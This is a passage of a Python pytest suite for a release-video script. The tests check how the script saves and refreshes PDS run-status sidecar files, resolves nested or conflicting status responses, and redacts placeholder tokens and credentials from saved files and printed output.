                    stderr=json.dumps(
                        {"runId": "agent_run_fixed_project", "status": "running"}
                    )
                    + "\n",
                    exit_code=1,
                )
            ),
            "--output-dir",
            str(output_dir),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    assert result.returncode == 1
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    persisted = json.loads(sidecar.read_text(encoding="utf8"))
    assert persisted["projectId"] == "fixed-release-project"
    assert "--project fixed-release-project" in persisted["recoverCommand"]
    assert "--project fixed-release-project" in persisted["watchCommand"]


def test_release_video_persists_compatibility_run_handle_sidecar(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    output_dir = tmp_path / "videos"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    compat_output = (
        "[pds] release-video run handle: "
        "runId=agent_run_line456 projectId=pdd-v1-1-0-release status=running\n"
        "[pds] recover: pds release-video status --run-id agent_run_line456 --json\n"
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=compat_output,
                    exit_code=1,
                )
            ),
            "--output-dir",
            str(output_dir),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    assert result.returncode == 1
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    assert sidecar.exists()
    persisted = json.loads(sidecar.read_text(encoding="utf8"))
    assert persisted["runId"] == "agent_run_line456"
    assert persisted["projectId"] == "pdd-v1-1-0-release"
    assert persisted["status"] == "running"
    assert "jobs watch --run-id agent_run_line456 --jsonl" in persisted["watchCommand"]
    assert str(sidecar) in result.stderr


def test_release_video_redacts_pds_supplied_recovery_commands(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    output_dir = tmp_path / "videos"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    compat_output = (
        "[pds] release-video run handle: "
        "runId=agent_run_secret_line status=running\n"
        "[pds] recover: pds --token secret-recover-token "
        "release-video status --run-id agent_run_secret_line --json\n"
        "[pds] watch: pds --pds-token secret-watch-token "
        "jobs watch --run-id agent_run_secret_line --jsonl\n"
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=compat_output,
                    exit_code=1,
                )
            ),
            "--output-dir",
            str(output_dir),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    sidecar_text = (output_dir / "v1.1.0" / "pds_run.json").read_text(encoding="utf8")
    persisted = json.loads(sidecar_text)
    assert result.returncode == 1
    assert "secret-recover-token" not in sidecar_text
    assert "secret-watch-token" not in sidecar_text
    assert "--token" not in persisted["recoverCommand"]
    assert "--pds-token" not in persisted["watchCommand"]
    assert "release-video status --run-id agent_run_secret_line --json" in persisted[
        "recoverCommand"
    ]
    assert "jobs watch --run-id agent_run_secret_line --jsonl" in persisted["watchCommand"]


def test_release_video_pds_metadata_prefers_terminal_json_status():
    release_video = load_release_video_module()

    metadata = release_video.extract_pds_run_metadata(
        "\n".join(
            [
                json.dumps({"runId": "agent_run_multi", "status": "running"}),
                json.dumps(
                    {
                        "runId": "agent_run_multi",
                        "projectId": "pdd-v1-1-0-release",
                        "status": "failed",
                    }
                ),
            ]
        )
    )

    assert metadata == {
        "runId": "agent_run_multi",
        "projectId": "pdd-v1-1-0-release",
        "status": "failed",
    }


def test_release_video_pds_metadata_keeps_nested_project_context():
    release_video = load_release_video_module()

    metadata = release_video.extract_pds_run_metadata(
        json.dumps(
            {
                "run": {"runId": "agent_run_nested", "status": "running"},
                "project": {"projectId": "pdd-v1-1-0-release"},
            }
        )
    )

    assert metadata == {
        "runId": "agent_run_nested",
        "projectId": "pdd-v1-1-0-release",
        "status": "running",
    }


def test_release_video_pds_metadata_keeps_current_run_over_nested_history():
    release_video = load_release_video_module()

    metadata = release_video.extract_pds_run_metadata(
        json.dumps(
            {
                "run": {"runId": "agent_run_current", "status": "running"},
                "project": {"projectId": "pdd-v1-1-0-release"},
                "history": [{"runId": "agent_run_old", "status": "failed"}],
            }
        )
    )

    assert metadata == {
        "runId": "agent_run_current",
        "projectId": "pdd-v1-1-0-release",
        "status": "running",
    }


def test_release_video_pds_metadata_prefers_result_over_history():
    release_video = load_release_video_module()

    metadata = release_video.extract_pds_run_metadata(
        json.dumps(
            {
                "history": [{"runId": "agent_run_old", "status": "failed"}],
                "result": {
                    "runId": "agent_run_current",
                    "projectId": "pdd-v1-1-0-release",
                    "status": "running",
                },
            }
        )
    )

    assert metadata == {
        "runId": "agent_run_current",
        "projectId": "pdd-v1-1-0-release",
        "status": "running",
    }


def test_release_video_status_prints_persisted_run_sidecar(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_status789",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
                "recoverCommand": (
                    "pds release-video status --run-id agent_run_status789 --json"
                ),
            }
        ),
        encoding="utf8",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env(),
        check=True,
    )

    assert "agent_run_status789" in result.stdout
    assert (
        "recover: pds --project pdd-v1-1-0-release release-video status "
        "--run-id agent_run_status789 --json"
        in result.stdout
    )
    assert result.stderr == ""


def test_release_video_status_marks_running_sidecar_as_stale(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_stale",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env(),
        check=True,
    )

    assert "agent_run_stale" in result.stdout
    assert "stale" in result.stdout.lower()
    assert "RELEASE_VIDEO_STATUS_QUERY=1" in result.stdout
    assert result.stderr == ""


def test_release_video_status_ignores_create_idempotency_conflict_env(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_status_env",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env(
            {
                "RELEASE_VIDEO_IDEMPOTENCY_KEY": "manual-key",
                "RELEASE_VIDEO_ATTEMPT_ID": "retry-operator",
            }
        ),
        check=True,
    )

    assert "agent_run_status_env" in result.stdout
    assert result.stderr == ""


def test_release_video_status_explicit_tag_does_not_require_local_git_tag(
    tmp_path: Path,
):
    repo = tmp_path / "repo-without-tags"
    repo.mkdir()
    output_dir = tmp_path / "videos"
    sidecar = output_dir / "v9.9.9" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps({"runId": "agent_run_no_local_tag", "status": "running"}),
        encoding="utf8",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v9.9.9",
            "--output-dir",
            str(output_dir),
            "--status",
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env(),
        check=True,
    )

    assert "agent_run_no_local_tag" in result.stdout
    assert result.stderr == ""


def test_release_video_status_query_uses_persisted_run_id(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_status_query",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps(
                        {"runId": "agent_run_status_query", "status": "succeeded"}
                    )
                    + "\n",
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    assert pds_capture_argv(capture) == [
        "--project",
        "pdd-v1-1-0-release",
        "release-video",
        "status",
        "--run-id",
        "agent_run_status_query",
        "--json",
    ]
    assert '"status": "succeeded"' in result.stdout
    assert result.stderr == ""


def test_release_video_status_query_refreshes_sidecar_with_terminal_status_and_context(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_terminal",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "ok": True,
        "runId": "agent_run_terminal",
        "projectId": "pdd-v1-1-0-release",
        "status": "failed",
        "runError": {
            "code": "provider_capacity",
            "message": "Provider capacity failure",
            "retryable": True,
            "details": {"failedStage": "specs"},
        },
    }

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env(
            {
                "PDS_STUB_CAPTURE": str(capture),
                "PDS_API_URL": "https://status.example.test",
                "PDS_TOKEN": "secret-status-token",
            }
        ),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["status"] == "failed"
    assert refreshed["lastStatusQuery"]["ok"] is True
    assert refreshed["lastStatusQuery"]["runStatus"] == "failed"
    assert refreshed["lastStatusQuery"]["response"]["runError"]["details"] == {
        "failedStage": "specs"
    }
    assert refreshed["pdsContext"]["apiUrl"] == "https://status.example.test"
    assert refreshed["pdsContext"]["apiUrlSource"] == "PDS_API_URL"
    assert refreshed["pdsContext"]["tokenSource"] == "PDS_TOKEN"
    assert "secret-status-token" not in sidecar.read_text(encoding="utf8")
    assert '"status": "failed"' in result.stdout
    assert result.stderr == ""


def test_release_video_status_query_redacts_secret_diagnostics(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_secret_diagnostics",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps(
                        {
                            "ok": False,
                            "error": {
                                "code": "auth_required",
                                "message": "Authorization: Bearer secret-status-token",
                            },
                            "signedUrl": "https://example.test/render?token=secret-url-token",
                        }
                    )
                    + "\n",
                    stderr="Authorization: Bearer secret-stderr-token\n",
                    exit_code=1,
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    persisted_text = sidecar.read_text(encoding="utf8")
    persisted = json.loads(persisted_text)
    assert result.returncode == 1
    assert "secret-status-token" not in persisted_text
    assert "secret-stderr-token" not in persisted_text
    assert "secret-url-token" not in persisted_text
    assert "[redacted]" in persisted_text
    assert persisted["lastStatusQuery"]["errorMessage"] == "Authorization: Bearer [redacted]"
    assert "auth_required" in result.stderr


def test_release_video_redacts_status_query_output_and_command_secrets(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_secret_output",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    failure_response = {
        "ok": False,
        "runId": "agent_run_secret_output",
        "status": "running",
        "message": (
            "diagnostic at https://example.test/render?"
            "X-Amz-Signature=secret-sig&token=secret-url-token"
        ),
    }

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps(failure_response) + "\n",
                    stderr=(
                        "pds --token secret-token --pds-token secret-pds-token "
                        "--api-key secret-api-key failed\n"
                    ),
                    exit_code=1,
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    combined_output = result.stdout + result.stderr
    sidecar_text = sidecar.read_text(encoding="utf8")
    assert result.returncode == 1
    for secret in (
        "secret-token",
        "secret-pds-token",
        "secret-api-key",
        "secret-sig",
        "secret-url-token",
    ):
        assert secret not in combined_output
        assert secret not in sidecar_text
    assert "[redacted]" in combined_output
    assert "[redacted]" in sidecar_text


def test_release_video_status_query_redacts_pds_api_url_context(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_api_url",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps(
                        {
                            "runId": "agent_run_api_url",
                            "projectId": "pdd-v1-1-0-release",
                            "status": "succeeded",
                        }
                    )
                    + "\n",
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env(
            {
                "PDS_STUB_CAPTURE": str(capture),
                "PDS_API_URL": (
                    "https://release-user:release-pass@status.example.test/status"
                    "?token=secret-url-token&X-Amz-Signature=secret-sig"
                ),
            }
        ),
        check=True,
    )

    persisted_text = sidecar.read_text(encoding="utf8")
    persisted = json.loads(persisted_text)
    for secret in (
        "release-user",
        "release-pass",
        "secret-url-token",
        "secret-sig",
    ):
        assert secret not in persisted_text
    assert "[redacted]" in persisted["pdsContext"]["apiUrl"]
    assert persisted["pdsContext"]["apiUrlSource"] == "PDS_API_URL"


def test_release_video_status_query_ignores_historical_terminal_runs(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "run": {"runId": "agent_run_current", "status": "running"},
        "project": {"projectId": "pdd-v1-1-0-release"},
        "history": [{"runId": "agent_run_old", "status": "failed"}],
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert refreshed["status"] == "running"
    assert refreshed["lastStatusQuery"]["runId"] == "agent_run_current"
    assert refreshed["lastStatusQuery"]["runStatus"] == "running"


def test_release_video_status_query_ignores_unrelated_terminal_json_values(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_stdout = "\n".join(
        [
            json.dumps({"runId": "agent_run_old", "status": "failed"}),
            json.dumps(
                {
                    "runId": "agent_run_current",
                    "projectId": "pdd-v1-1-0-release",
                    "status": "running",
                }
            ),
        ]
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=status_stdout + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert refreshed["status"] == "running"
    assert refreshed["lastStatusQuery"]["runId"] == "agent_run_current"
    assert refreshed["lastStatusQuery"]["runStatus"] == "running"


def test_release_video_status_query_ignores_unscoped_terminal_json_after_current_run(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_stdout = "\n".join(
        [
            json.dumps(
                {
                    "runId": "agent_run_current",
                    "projectId": "pdd-v1-1-0-release",
                    "status": "running",
                }
            ),
            json.dumps({"status": "failed", "message": "old unrelated terminal event"}),
        ]
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=status_stdout + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is False
    assert refreshed["lastStatusQuery"]["response"]["runId"] == "agent_run_current"
    assert refreshed["lastStatusQuery"]["runStatus"] == "running"


def test_release_video_status_query_prefers_wrapped_current_run_over_unscoped_terminal(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_stdout = "\n".join(
        [
            json.dumps(
                {
                    "ok": True,
                    "result": {
                        "runId": "agent_run_current",
                        "projectId": "pdd-v1-1-0-release",
                        "status": "succeeded",
                    },
                }
            ),
            json.dumps({"status": "failed", "message": "old unrelated terminal event"}),
        ]
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=status_stdout + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert refreshed["status"] == "succeeded"
    assert refreshed["statusStale"] is False
    assert refreshed["lastStatusQuery"]["response"]["result"]["runId"] == "agent_run_current"
    assert refreshed["lastStatusQuery"]["runStatus"] == "succeeded"


def test_release_video_status_query_keeps_stale_for_unscoped_status_wrapper(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout='{"ok": true, "status": "success"}\n')),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is True
    assert refreshed["lastStatusQuery"]["runStatus"] == "running"


def test_release_video_status_query_keeps_project_for_unscoped_project_response(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "projectId": "wrong-project",
        "status": "succeeded",
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is True
    assert "--project pdd-v1-1-0-release" in refreshed["recoverCommand"]
    assert "wrong-project" not in refreshed["recoverCommand"]
    assert "wrong-project" not in refreshed["watchCommand"]


def test_release_video_status_query_keeps_project_for_nested_run_wrapper_project(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "ok": True,
        "projectId": "wrong-project",
        "run": {"runId": "agent_run_current", "status": "running"},
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is False
    assert "--project pdd-v1-1-0-release" in refreshed["recoverCommand"]
    assert "wrong-project" not in refreshed["recoverCommand"]
    assert "wrong-project" not in refreshed["watchCommand"]


def test_release_video_status_query_prefers_nested_run_status_over_wrapper_status(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "ok": True,
        "status": "success",
        "run": {"runId": "agent_run_current", "status": "running"},
        "project": {"projectId": "pdd-v1-1-0-release"},
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is False
    assert refreshed["lastStatusQuery"]["runStatus"] == "running"


def test_release_video_status_query_keeps_project_for_parent_wrapper_project(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "ok": True,
        "projectId": "wrong-project",
        "result": {"runId": "agent_run_current", "status": "succeeded"},
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert refreshed["status"] == "succeeded"
    assert refreshed["statusStale"] is False
    assert "--project pdd-v1-1-0-release" in refreshed["recoverCommand"]
    assert "wrong-project" not in refreshed["recoverCommand"]
    assert "wrong-project" not in refreshed["watchCommand"]


def test_release_video_status_query_ignores_envelope_status_without_run_status(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "ok": True,
        "status": "success",
        "run": {"runId": "agent_run_current"},
        "project": {"projectId": "pdd-v1-1-0-release"},
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
